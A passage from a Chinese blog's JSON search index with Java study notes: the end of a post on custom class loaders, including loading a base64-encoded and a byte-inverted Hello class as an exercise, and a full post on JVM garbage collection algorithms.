file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/jfr.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/classes\n拓展类加载器 ClassLoader -> sun.misc.Launcher$ExtClassLoader@6d06d69c\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/sunec.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/nashorn.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/cldrdata.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/dnsns.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/localedata.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/sunjce_provider.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/sunpkcs11.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/jaccess.jar\n ===> file:/Users/yq/.sdkman/candidates/java/8.0.275.hs-adpt/jre/lib/ext/zipfs.jar\n ===> file:/System/Library/Java/Extensions/MRJToolkit.jar\n应用类加载器 ClassLoader -> sun.misc.Launcher$AppClassLoader@659e0bfd\n ===> file:/Users/yq/code/wangyonghong/code-lab/gtu-java/out/production/gtu-java/\n```\n\n## 用户自定义类加载器\n\n- 在 Java 的日常应用程序开发中，类的加载几乎是由上述 3 种类加载器相互配合执行的，在必要时，我们还可以自定义类加载器，来定制类的加载方式\n- 为什么要自定义类加载器\n  - 隔离加载类\n  - 修改类加载方式\n  - 拓展加载源\n  - 防止源码泄露\n\n- 开发人员可以通过继承抽象类 java.lang.ClassLoader 类的方式，实现自己的类加载器，以满足一些特殊需求\n- 在 JDK 1.2 之前，在自定义类加载器时，总会去继承 ClassLoader 类并重写 loadClass() 方法，从而实现自定义的类加载器类，但是在 JDK 1.2 之后已不再建议用户去覆盖 loadClass() 方法，而是建议把自定义的类加载逻辑写在 findClass() 方法中\n- 在编写自定义类加载器时，如果没有太过于复杂的需求，可以直接继承 URLClassLoader 类，这样就可以避免自己去编写 findClass() 方法以及获取字节码流的方式，使自定义类加载器编写更加简单\n\n\n```java\npublic class Hello {\n    public void hello() {\n        System.out.println(\"Hello, classLoader!\");\n    }\n}\n```\n\n通过以下方法拿到 base64\n\n```shell\n$ javac Hello.java\n$ base64 Hello.class \nyv66vgAAADQAHAoABgAOCQAPABAIABEKABIAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVoZWxsbwEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAHAAgHABYMABcAGAEAE0hlbGxvLCBjbGFzc0xvYWRlciEHABkMABoAGwEABUhlbGxvAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAgABAAcACAABAAkAAAAdAAEAAQAAAAUqtwABsQAAAAEACgAAAAYAAQAAAAQAAQALAAgAAQAJAAAAJQACAAEAAAAJsgACEgO2AASxAAAAAQAKAAAACgACAAAABgAIAAcAAQAMAAAAAgAN\n\n```\n\n通过以下方法可以自定义ClassLoader\n\n```java\nimport java.util.Base64;\n\n/**\n * @author yonghongwang#163.com\n * @since 2021/4/2\n */\npublic class HelloClassLoader extends ClassLoader {\n    public static void main(String[] args) {\n        try {\n            new HelloClassLoader().findClass(\"Hello\").newInstance();\n        } catch (InstantiationException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        String helloBase64 = \"yv66vgAAADQAHAoABgAOCQAPABAIABEKABIAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVoZWxsbwEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAHAAgHABYMABcAGAEAE0hlbGxvLCBjbGFzc0xvYWRlciEHABkMABoAGwEABUhlbGxvAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAgABAAcACAABAAkAAAAdAAEAAQAAAAUqtwABsQAAAAEACgAAAAYAAQAAAAQAAQALAAgAAQAJAAAAJQACAAEAAAAJsgACEgO2AASxAAAAAQAKAAAACgACAAAABgAIAAcAAQAMAAAAAgAN\";\n        byte[] bytes = decode(helloBase64);\n        return defineClass(name, bytes, 0, bytes.length);\n    }\n\n    private byte[] decode(String base64) {\n        return Base64.getDecoder().decode(base64);\n    }\n}\n```\n\n## 添加类的几种方式？\n\n1. 放到 JDK 的 lib/ext 下，或者 -Djava.ext.dirs=path\n2. java -cp/classpath 或者 class 文件放到当前路径\n3. 自定义 ClassLoader 加载\n4. 拿到当前执行类的 ClassLoader，反射调用 addUrl 方法添加 Jar 或路径（JDK 9 之后平级了，可以使用 `Class.forName(\"xxx\", new URLClassLoader(\"path\"));`）\n\n## 练习\n\n自定义一个 Classloader，加载一个 Hello.xlass 文件，执行 hello 方法， 此文件内容是一个 Hello.class 文件所有字节(x=255-x)处理后的文件。\n\n题解\n\n```java\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.net.URLDecoder;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\n\n/**\n * @author yonghongwang#163.com\n */\npublic class MyClassloader extends ClassLoader {\n    public static void main(String[] args) {\n        Class<?> helloClass = new MyClassloader().findClass(\"Hello\");\n        Method helloMethod = null;\n        try {\n            helloMethod = helloClass.getMethod(\"hello\");\n        } catch (NoSuchMethodException e) {\n            e.printStackTrace();\n        }\n        try {\n            helloMethod.invoke(helloClass.newInstance());\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            e.printStackTrace();\n        } catch (InstantiationException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected Class<?> findClass(String name) {\n        String path = this.getClass().getResource(\"Hello.xlass\").getPath();\n        File file;\n        try {\n            file = new File(URLDecoder.decode(path, \"UTF-8\"));\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"failed to find path: \" + path);\n        }\n        byte[] bytes;\n        if (file.isFile() && file.exists()) {\n            try (FileChannel channel = new FileInputStream(file).getChannel()) {\n                ByteBuffer byteBuffer = ByteBuffer.allocate((int) channel.size());\n                channel.read(byteBuffer);\n                bytes = byteBuffer.array();\n            } catch (IOException e) {\n                throw new RuntimeException(\"failed to find path: \" + path);\n            }\n        } else {\n            throw new RuntimeException(\"failed to find path: \" + path);\n        }\n        return defineClass(name, decode(bytes), 0, bytes.length);\n    }\n\n    /**\n     * replace each byte with x->255-x\n     */\n    private byte[] decode(byte[] bytes) {\n        for (int i = 0; i < bytes.length; i++) {\n//            bytes[i] = (byte) (255 - bytes[i]);\n            bytes[i] = (byte) ~bytes[i];\n        }\n        return bytes;\n    }\n}\n\n```\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Java 进阶 06 —— JVM 垃圾回收算法","url":"/java-advance/06-jvm-gc-algo/","content":"\n# 为什么会有 GC\n\n本质上是内存资源的有限性，因此需要大家共享使用，手工申请，手动释放。\n\n垃圾收集，不是 Java 语言的伴生产物。早在 1960 年，第一门开始使用内存动态分配和垃圾收集技术的 Lisp 语言诞生。\n\n关于垃圾收集有三个经典问题：\n\n- 哪些内存需要回收？\n- 什么时候回收？\n- 如何回收？\n\n<!-- more -->\n\n垃圾收集机制是 Java 语言的招牌能力，极大地提高了开发效率。如今，垃圾收集几乎成为现代语言的标配，即使经过如此长时间的发展，Java 的垃圾收集机制仍然在不断的演进中，不同大小的设备、不同特征的应用场景，对垃圾收集提出了新的挑战，这当然也是面试的热点。\n\n面试题：\n\n- 垃圾回收器，各自优缺点，CMS、G1\n- GC 算法有哪些，目前的 JDK 版本采用什么回收算法\n- GC 两种判定方法\n- 分代回收\n- 垃圾收集策略和算法\n- 平时如何搭配使用垃圾回收器\n- 什么情况触发垃圾回收\n- System.gc() runtime.gc()\n- Java  GC 机制，GC Roots 有哪些\n- CMS 回收停顿了几次，为什么？\n\n# 什么是垃圾（Garbage）\n\n垃圾是指在运行程序中没有任何指针指向的对象，这个对象就是需要被回收的垃圾。An object is considered garbage when it  can no longer be  reached from any pointer in the running program .\n\n如果不及时对内存中的垃圾进行清理，那么，这些垃圾对象所占用的内存空间会一直保留到应用程序结束，被保留的空间无法被其他对象使用。甚至可能导致内存溢出。\n\n# 为什么需要垃圾回收\n\n对于高级语言来说，一个基本认知是如果不进行垃圾回收，内存迟早都会被消耗完，因为不断地分配内存空间而不进行回收，就好像不停的生产而从来不打扫一样。\n\n除了释放没用的对象，垃圾回收也可以清除内存里的记录碎片。碎片整理将所占用的堆内存移到堆的一端，以便 JVM 将整理出的内存分配给新的对象。\n\n随着应用程序所应对的业务越来越庞大、复杂，用户越来越多，没有 GC 就不能保证应用程序的正常进行。而经常造成 STW 的 GC 又跟不上实际的需求，所以才会不断地尝试对 GC 进行优化。\n\n \n# 早期垃圾回收\n\n在早期的 C/C++ 时代，垃圾回收基本上是手工进行的。开发人员可以使用 new 关键字进行内存申请，并使用 delete 关键字进行内存释放。比如以下代码\n\n```c++\nMibBridge *pBridge = new cmBaseGroupBridge();\n// 如果注册失败，使用 delete 关键字释放该对象所占用内存区域\nif (pBridg->Register(kDestroy) != NO_ERROR) {\n    delete pBridge;\n}\n```\n\n这种方式可以灵活控制内存释放的时间，但是会给开发人员带来频繁申请和释放内存的管理负担。倘若有一处内存区间由于程序员编码的问题忘记被回收，那么就会产生内存泄露，垃圾对象永远无法被清除，随着系统运行时间的不断增长，垃圾对象所耗内存可能持续上升，直到出现内存溢出并造成应用程序崩溃。\n\n有了垃圾回收机制后，上述代码块极有可能变成这样：\n\n```c++\nMibBridge *pBridge = new cmBaseGroupBridge();\npBridg->Register(kDestroy);\n```\n\n现在，除了 Java 以外，C#、Python、Ruby 等语言都使用了自动垃圾回收的思想，也是未来发展趋势。可以说，这种自动化的内存分配和垃圾回收的方式已经成为现代开发语言必备的标准。\n\n# Java 垃圾回收机制\n\n自动内存管理，无需开发人员手动参与内存的分配与回收，这样降低了内存泄漏和内存溢出的风险。\n\n- 没有垃圾回收器，java 也会和 cpp 一样，各种悬垂指针，野指针，泄露问题让你头疼不已。\n\n自动内存管理机制，将程序员从繁重的内存管理中释放出来，可以更专注地专心于业务开发。\n\n[Oracle 官网关于垃圾回收的介绍](https://docs.oracle.com/javase/8/docs/technotes/guides/vm/gctuning/toc.html)\n\n担忧：\n\n对于 Java 开发人员而言，自动内存管理就像是一个黑匣子，如果过度依赖于”自动“，那么这将会是一场灾难，最严重的就会弱化 Java 开发人员在程序出现内存溢出时定位问题和解决问题的能力。\n\n此时，了解 JVM 的自动内存分配和内存回收原理就显得非常重要，只有在真正了解 JVM 是如何管理内存后，我们才能够在遇见 OOM 时，快速地根据错误异常日志定位问题和解决问题。\n\n当需要排查各种内存溢出、内存泄漏问题时，当垃圾收集器很难过为系统达到更高并发量的瓶颈时，我们就必须对这些”自动化“的技术是是必要的监控和调优。\n\n垃圾回收器可以对年轻代回收，也可以对老年代回收，甚至全堆和方法区的回收。\n\n---\n\n- 其中，Java 堆是垃圾收集器的工作重点\n\n从次数上讲：\n\n- 频繁收集年轻代\n- 较少收集老年代\n- 基本不动方法区/永久代/元空间\n\n# 垃圾回收相关算法\n\n## 垃圾标记阶段\n\n在堆里存放着几乎所有的 Java 对象实例，在 GC 执行垃圾回收之前，首先**需要区分出内存中哪些是存活的对象，哪些是已经死亡的对象**。只有被标记为已经死亡的对象，GC 才会在执行垃圾回收时，释放掉其所占有的内存空间，因此这个过程我们称为**垃圾标记阶段**。\n\n那么在 JVM 中究竟是如何标记一个死亡对象呢？简单来说，当一个对象已经不再被任何的存活对象继续引用时，就可以宣判为已经死亡。\n\n判断对象存活一般有两种方式：**引用计数法**和**可达性分析算法**。\n\n### 方式一：引用计数算法\n\n引用计数算法（Reference Counting）比较简单，对每个对象保存一个整型的**引用计数器属性用于记录对象被引用的情况**。\n\n对于一个对象 A，只要有任何一个对象引用了 A，则 A 的引用计数器就加 1；当引用失效时，引用计数器就减 1。只要对象 A 的引用计数器的值为 0，即表示对象 A 不可能再被使用，可进行回收。\n\n优点：**实现简单，垃圾对象便于辨识；判定效率高，回收没有延迟性**。\n\n缺点：\n\n- 它需要单独的字段存储计数器，这样的做法增加了**存储空间的开销**。\n- 每次赋值都需要更新计数器，伴随着加法和减法操作，这增加了**时间开销**。\n- 引用计数器有一个严重的问题，即**无法处理循环引用**的情况。这是一条致命的缺陷，导致在 Java 的垃圾回收器中没有使用这类算法。\n\n#### 小结\n\n引用计数算法，是很多语言的资源回收选择，例如因人工智能而更加火热的 Python，它更是同时支持引用计数和垃圾收集机制。\n\n具体哪种最优是要看场景的，业界有大规模实践中仅保留引用计数机制，以提高吞吐量的尝试。\n\nJava 并没有选择引用计数，是因为其存在一个基本的难题，也就是很难处理循环引用关系。\n\nPython 如何解决循环引用？\n\n- 手动解除：很好理解，就是在合适的时机，解除引用关系。\n- 使用弱引用 weakref，weakref 是 Python 提供的标准库，旨在解决循环引用。\n\n\n\n### 方式二：可达性分析算法\n\n可达性分析算法又叫做根搜索算法，或者是追踪性垃圾收集。\n\n相对于引用计数法而言，可达性分析算法不仅同样具备实现简单和执行高效等特点，更重要的是该算法可以有效地解决在引用计数算法中循环引用的问题，防止内存泄漏的发生。\n\n相较于引用计数算法，这里的可达性分析就是 Java、C# 选择的。这种类型的垃圾收集器通常也叫做**追踪性垃圾收集器（Tracing Garbage Collector）**。\n\n所谓 ”GC Roots“ 根集合就是一组必须活跃的引用。\n\n基本思路：\n\n- 可达性分析算法是以根对象集合（GC Roots）为起始点，按照从上至下的方式**搜索被根对象集合所连接的目标对象是否可达**。\n- 使用可达性分析算法后，内存中的存活对象都会被根对象集合直接或间接连接着，搜索走过的路径称为**引用链（Reference Chain）**\n- 如果目标对象没有任何引用链相连，则是不可达的，就意味着该对象已经死亡，可以标记为垃圾对象\n- 在可达性分析算法中，只有能够被根对象集合直接或间接连接的对象才是存活对象\n\n这个算法目前较为常用。\n\n#### GC Roots\n\n在 Java 语言中，GC Roots 包括以下几类元素：\n\n- 虚拟机栈中引用的对象\n  - 比如，各个线程被调用的方法中使用到的参数、局部变量等。\n- 本地方法栈内 JNI（通常说的本地方法）引用的对象\n- 方法区中类静态属性引用的对象\n  - 比如：Java 类的引用类型静态变量\n- 方法区中常量引用的对象\n  - 比如：字符串常量池里的引用\n- 所有被同步锁 synchronized 持有的对象\n- Java 虚拟机内部的引用\n  - 基本数据类型对应的 Class 对象，一些常驻的异常对象（如：NullPointerException、OutOfMemoryError），系统类加载器。\n- 反映 Java 虚拟机内部情况的 JMXBean、JVMTI 中注册的回调、本地代码缓存等。\n\n除了这些固定的 GC Roots 集合以外，根据用户所选用的垃圾收集器以及当前回收的内存区域不同，还可以有其他对象 临时性 地加入，共同构成完整 GC Roots 集合。比如，分代收集和局部回收（Partial GC）\n\n- 如果只针对 Java 堆中的某一块区域进行垃圾回收（比如：典型的只针对新生代），必须考虑到内存区域是虚拟机自己的实现细节，更不是孤立封闭的，这个区域的对象完全有可能被其他区域的对象所引用，这时候就需要一并将关联的区域对象也加入 GC Roots 集合中去考虑，才能保证可达性分析的准确性。\n\n**小技巧：**由于 Root 采用栈方式存放变量和指针，所以如果一个指针，它保存了堆内存里面的对象，但是自己又不存放在堆内存里面，那它就是一个 Root。\n\n**注意：**如果要使用可达性分析算法来判断内存是否可回收，那么分析工作必须在一个能够保障一致性的快照中进行。这点不满足的话分析结果的准确性就无法保证。\n\n这点也是导致 GC 时进行必须 ”Stop The World“ 的一个重要原因。\n\n- 即使是号称（几乎）不会发生停顿的 CMS 收集器中，**枚举根节点时也是必须要停顿的**。\n\n\n#### 对象的 finalization 机制\n\nJava 语言提供了对象终止（finalization）机制来允许开发人员提供对象被销毁之前的自定义处理逻辑。\n\n当垃圾回收器发现没有引用指向一个对象，即：垃圾回收此对象之前，总会先调用这个对象的 finalize() 方法。\n\n finalize() 方法允许在子类中被重写，用于在对象被回收时进行资源释放。通常在这个方法中进行一些资源释放和清理的工作，比如关闭文件、套接字和数据库连接等。\n\n永远不要主动调用对象的 finalize() 方法，应该交给垃圾回收机制调用。理由包括以下 3 点：\n\n- 在 finalize() 时可能会导致对象复活。\n\n- finalize() 方法执行时间是没有保障的，它完全由 GC 线程决定，极端情况下，若不发生 GC，则  finalize() 方法将没有执行机会。\n- 一个糟糕的  finalize() 会严重影响 GC 性能\n\n从功能上来说， finalize() 方法与 C++ 中的析构函数比较相似，但是 Java 采用的是基于垃圾回收器的自动内存管理机制，所以  finalize() 方法在本质上不同于 C++ 中的析构函数。\n\n由于  finalize() 方法的存在，虚拟机中的对象一般处于三种可能的状态。\n\n#### 生存还是死亡？\n\n如果所有的根节点都无法访问到某个对象，说明对象已经不再使用了。一般来说，此对象需要被回收。但事实上，也并非是 “非死不可” 的，这时候它们暂时处于 “缓刑” 阶段。一个无法触及的对象有可能在某一个条件下 ”复活“，如果这样，那么对它的回收就是不合理的，为此，定义虚拟机中的对象可能的三种状态。如下：\n\n- 可触及的：从根节点开始，可以到达这个对象。\n- 可复活的：对象的所有引用都被释放，但是对象有可能在  finalize() 中复活。\n- 不可触及的：对象的 finalize() 方法被调用，并且没有复活，那么就会进入不可触及状态。不可触及的对象不可能被复活，因为  finalize() 方法只会被调用一次。\n\n以上 3 种状态中，是由于 finalize() 方法的存在进行的区分。只有在对象不可触及时才可以被回收。\n\n#### 具体过程\n\n判定一个对象 objA 是否可回收，至少要经历两次标记过程：\n\n- 如果对象 objA 到 GC Roots 没有引用链，则进行第一次标记\n- 进行筛选，判断此对象是否有必要执行  finalize() 方法\n  - 如果对象 objA 没有重写 finalize() 方法，或者 finalize() 方法已经被虚拟机调用过，则虚拟机视为 ”没有必要执行“，objA 被判定为不可触及的。\n  - 如果对象 objA 重写了 finalize() 方法，且还未执行过，那么 objA 会被插入到 F-Queue 队列中，由一个虚拟机自动创建的、低优先级的 Finalizer 线程触发其 finalize() 方法执行。\n  - finalize() 方法是对象逃脱死亡的最后机会，稍后 GC 会对 F-Queue 队列中的对象进行第二次标记。如果 objA 在 finalize() 方法中与引用链上的任何一个对象建立了联系，那么在第二次标记时，objA 会被移出 ”即将回收“ 集合。之后，对象会再次出现没有引用存在的情况。在这个情况下，finalize() 方法不会被再次调用，对象会直接变成不可触及的状态，也就是说，一个对象的 finalize() 方法只会被调用一次。\n\n#### MAT 与 JProfiler 的 GC Roots 溯源\n\nMAT 是 Memory Analyzer 的简称，它是一款功能强大的 Java 堆内存分析器，用于查找内存泄露以及查看内存消耗情况。\n\nMAT 是基于 Eclipse 开发的，是一款免费的性能分析工具。\n\nhttps://www.eclipse.org/mat/\n\n#### 获取 dump 文件\n\n- 命令行使用 jmap\n  - jps\n  - jmap -dump:format=b,live,file=test1.bin 14036\n- 使用 JVisualVM 导出\n  - 捕获的 heap dump 文件是一个临时文件，关闭 JVisualVM 后自动删除，若要保留，需要将其另存为文件。\n  - 可以通过以下方式捕获 heap dump\n    - 在左侧 Application 子窗口中右击相应的应用程序，选择 Heap Dump\n    - 在 Monitor 子标签页中点击 Heap Dump 按钮\n  - 本地应用程序的 Heap Dumps 作为应用程序标签页的一个子标签页打开。同时，Heap Dump 在左侧 Application 栏中对应一个含有时间戳的节点，右击这个节点选择 Save As 即可将 Heap Dump 文件保存到本地。\n\n\n## 垃圾清除阶段\n\n当成功区分出内存中存活对象和死亡对象后，GC 接下来的任务就是执行垃圾回收，释放掉无用对象所占用的内存空间，以便有足够的可用内存空间为新对象分配内存。\n\n目前在 JVM 比较常见的三种垃圾收集算法是 标记-清除算法（Mark-Sweep）、复制算法（Copying）、标记-压缩算法（Mark-Compact）\n\n### 标记-清除算法（Mark-Sweep）\n\n#### 背景\n\n标记-清除算法（Mark-Sweep）是一种非常基础和常见的垃圾收集算法，该算法被 J.McCarthy 等人在 1960 年提出并应用于 List 语言。\n\n#### 执行过程\n\n当堆中的有效内存空间（available memory）被耗尽的时候，就会停止整个程序（也被称为 Stop The World），然后进行两项工作，第一项是标记，第二项则是清除。\n\n- 标记：Collector 从引用根节点开始遍历，标记所有被引用的对象。一般是在对象的 Header 中记录为可达对象。\n- 清除：Collector 对对堆内存从头到尾进行线性的遍历，如果发现某个对象在其 Header 中没有标记为可达对象，则将其回收。\n\n缺点：\n\n- 效率不算高\n- 在进行 GC 的时候，需要停止整个应用程序，导致用户体验差\n- 这种方式清理出来的空闲内存空间是不连续的，产生内存碎片。需要维护一个空闲列表\n\n注意：何为清除？\n\n这里所谓的清除并不是真的置空，而是把需要清除的对象地址保存在空闲的地址列表里。下次有新对象需要加载时，判断垃圾的位置空间是否够，如果够，就存放。\n\n\n\n### 复制算法（Copying）\n\n#### 背景\n\n为了解决标记-清除算法在垃圾收集效率方面的缺陷，M.L.Minsky 于1963 年发表了著名的论文，”使用双存储区的 Lisp 语言垃圾收集器 （A Lisp Garbage Collector Algorithm Using Serial Secondary Storage）“。M.L.Minsky 本人成功地引入到了 Lisp 语言的一个实现版本中。\n\n#### 核心思想\n\n将活着的内存空间分为两块，每次只是用其中一块，在垃圾回收时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，最后完成垃圾回收。\n\n优点\n\n- 没有标记和清除过程，实现简单，运行高效\n\n- 复制过去以后保证空间的连续性，不会出现”碎片问题“\n\n缺点\n\n- 此算法的缺点也是很明显的，就是需要两倍的内存空间。\n\n- 对于 G1 这种分拆成为大量 region 的GC，复制而不是移动，意味着 GC 需要维护 region 之间对象引用关系，不管是内存占用或者时间开销也不小\n\n特别的：\n\n- 如果系统中的垃圾对象很多，复制短发需要复制的存活对象数量并不会太大，或者说非常低。\n\n应用场景：\n\n在新生代，对应常规应用的垃圾回收，一次通常可以回收 70% - 99% 的内存空间，回收性价比很高。所以现在的商业虚拟机都是用这种收集算法回收新生代。\n\n\n### 标记-压缩算法（Mark-Compact）\n\n#### 背景\n\n复制算法的高效性，是建立在存活对象少、垃圾对象多的前提下的。这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，由于存活对象较多，复制的成本也将很高。因此，基于老年代垃圾回收的特性，需要使用其他的算法。\n\n标记-清除算法的确可以应用在老年代中，但是该算法不仅执行效率低下，而且在执行完内存回收后还会产生内存碎片，所以 JVM 的设计者需要在此基础上进行改进。标记-压缩（Mark-Compact）算法也由此诞生。\n\n1970 年前后，G.L.Steele、C.J.Chene 和 D.S.Wise 等研究者发布标记-压缩算法。在许多现代的垃圾回收器中，人们都是用了标记-压缩算法或其改进版本。\n\n#### 执行过程\n\n第一阶段和标记清除算法一样，从根节点开始标记所有被引用对象。\n\n第二阶段将所有的存活对象压缩到内存的一端，按顺序排放。\n\n之后清理边界外所有的空间。\n\n标记-压缩算法的最终效果等同于标记-清除算法执行完成后，再进行一次内存碎片整理，因此，也可以把它称为 标记-清除-压缩（Mark-Sweep-Compact） 算法。\n\n二者本质差异在于标记-清除算法是一种非移动式的回收算法，标记-压缩是移动式的。是否移动回收后的存活对象是一项优缺点并存的风险决策。\n\n可以看到，标记的存活对象将会被整理，按照内存地址依次排列，而未被标记的内存会被清理掉。如此一来，当我们需要给新对象分配内存时，JVM 只需要持有一个内存的起始地址即可，这比维护一个空闲列表显然少了许多开销。\n\n**指针碰撞（Bump the Pointer）**\n\n如果内存空间以规整和有序的方式分布，即已用和未用的内存都各自一边，彼此之间维系着一个记录下一次分配起始点的标记指针，当为新对象分配内存时，只需要通过修改指针的偏移量将新对象分配在第一个空闲内存位置上，这种分配方式就叫做指针碰撞。\n\n**优点**\n\n消除了标记-清除算法当中，内存区域分散的缺点，我们需要给新对象分配内存时，JVM 只需要持有一个内存的起始地址即可。\n\n消除了复制算法当中，内存减半的高额代价\n\n**缺点**\n\n从效率上来说，标记-整理算法要低于复制算法。\n\n移动对象的同时，如果对象被其他对象引用，则还需要调整引用的地址。\n\n移动的过程中，需要全程暂停用户应用程序。即：STW\n\n### 小结\n\n|          | Mark-Sweep         | Mark-Compact     | Copying    |\n| -------- | ------------------ | ---------------- | --------------- |\n| 速度     | 中等               | 最慢             | 最快          |\n| 空间开销 | 少（但会堆积碎片） | 少（不堆积碎片） | 通常需要活对象的 2 倍大小（不堆积碎片） |\n| 移动对象 | 否                 | 是               | 是        |\n\n效率上来说，复制算法是当之无愧的老大，但是却浪费了太多内存。\n\n而为了尽量兼顾上面提到的三个指标，标记-整理算法相对来说更平滑一些，但是效率上不尽如人意，它比复制算法多了一个标记阶段，比标记-清除算法多了一个整理内存的阶段。\n\n**难道就没有一种最优算法吗？**\n\n没有最好的算法，只有最合适的算法。\n\n## 分代收集算法\n\n前面所有这些算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和缺点。分代收集算法应运而生。\n\n分代收集算法，是基于这样一个事实：不同的对象的生命周期是不一样的。因此，**不同生命周期的对象可以采取不同的收集方式，以便提高回收效率**。一般是把 Java 堆分为新生代和老年代，这样就可以根据各个年龄代的特点使用不同的回收算法，以提高垃圾回收的效率。\n\n在 Java 程序运行过程中，会产生大量的对象，其中有些对象是与业务信息相关，比如 HTTP 请求中的 Session 对象、线程、Socket 连接，这类对象跟业务直接挂钩，因此生命周期比较长。但是还有一些对象，主要是程序运行过程中生成的临时变量，这些对象生命周期会比较短，比如：String 对象，由于其不变性，系统会产生大量的这些对象，有些对象甚至只用一次即可回收。\n\n目前几乎所有的 GC 都是采用分代收集（Generational Collecting）算法执行垃圾回收的。\n\n在 HotSpot 中，基于分代的概念，GC 所使用的内存回收算法必须结合年轻代和老年代各自的特点。\n\n- 年轻代（Young Gen）\n  - 年轻代的特点：区域相对老年代较小，对象生命周期短、存活率低，回收频繁。\n  - 这种情况复制算法的回收整理，速度是最快的。复制算法的效率只和当前存活对象大小有关，因此很适用于年轻代的回收。而复制算法内存利用率不高的问题，通过 HotSpot 中的两个 Survivor 的设计得到缓解\n- 老年代（Tenured Gen）\n  - 老年代特点：区域较大，对象生命周期长、存活率高，回收不及年轻代频繁。\n  - 这种情况存在大量存活率高的对象，复制算法明显变得不合适。一般是由标记-清除或是标记-清除与标记-整理的混合实现。\n    - Mark 阶段的开销与存活对象的数量成正比。\n    - Sweep 阶段的开销与所管理区域大小成正比。\n    - Compact 阶段的开销与存活对象的数据成正比。\n\n**以 HotSpot 中的 CMS 回收器为例，CMS 是基于 Mark-Sweep 实现的，对于对象的回收率很高。而对于碎片问题，CMS 采用基于 Mark-Compact 算法的 Serial Old 回收器作为补偿：当内存回收不佳（碎片导致的 Concurrent Mode Failure 时），将采用 Serial Old 执行 Full GC 以达到对老年代内存的整理。**\n\n分代的思想被现有的虚拟机广泛使用。几乎所有的垃圾回收器都区分新生代和老年代。\n\n## 增量收集算法、分区算法\n\n### 增量收集算法（Incremental Collecting）\n\n上述现有的算法，在垃圾回收过程中，应用软件将处于一种 STW 的状态。在 STW 状态下，应用程序所有的线程都会挂起，暂停一切正常的工作，等待垃圾回收的完成。如果垃圾回收时间过长，应用程序会被挂起很久，**将严重影响用户体验或者系统的稳定性**。为了解决这个问题，即对实时垃圾收集算法的研究直接导致了增量收集（Incremental Collecting）算法的诞生。\n\n基本思想：如果一次性将所有的垃圾进行处理，需要造成系统长时间的停顿，那么就可以让垃圾收集线程和应用程序线程交替执行。每次，**垃圾收集线程只收集一小片区域的内存空间，接着切换到应用程序线程。依次反复，直到垃圾收集完成**。\n\n总的来说，增量收集算法的基础仍然是传统的标记-清除和复制算法。**增量收集算法通过对线程间冲突的妥善处理，允许垃圾收集线程以分阶段方式完成标记、清理或复制工作。**\n\n缺点：使用这种方式，由于在垃圾回收过程中，间断性地还执行了应用程序代码，所以能减少系统的停顿时间。但是，因为**线程切换和上下文转换**的消耗，会使得垃圾回收的总体成本上升，**造成系统吞吐量的下降**。\n\n### 分区算法\n\n一般来说，在相同条件下，堆空间越大，一次 GC 时所需要的时间就越长，有关 GC 产生的停顿也越长。为了更好的控制 GC 产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标的停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次 GC 所产生的停顿。\n\n分代算法将按照对象的生命周期长短划分成两个部分，分区算法将整个堆空间划分成连续的不同小区间 region。每一个小区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。\n\n\n总结：注意，这些只是基本的算法思路，实际 GC 实现过程要复杂的多，目前还在发展中的前沿 GC 都是复合算法，并且并行和并发兼备。\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Java 进阶 07 —— JVM 垃圾回收相关概念","url":"/java-advance/07-jvm-gc/","content":"\n## System.gc() 的理解\n\n在默认情况下，通过 System.gc() 或者 Runtime.getRuntime().gc() 的调用，**会显示触发 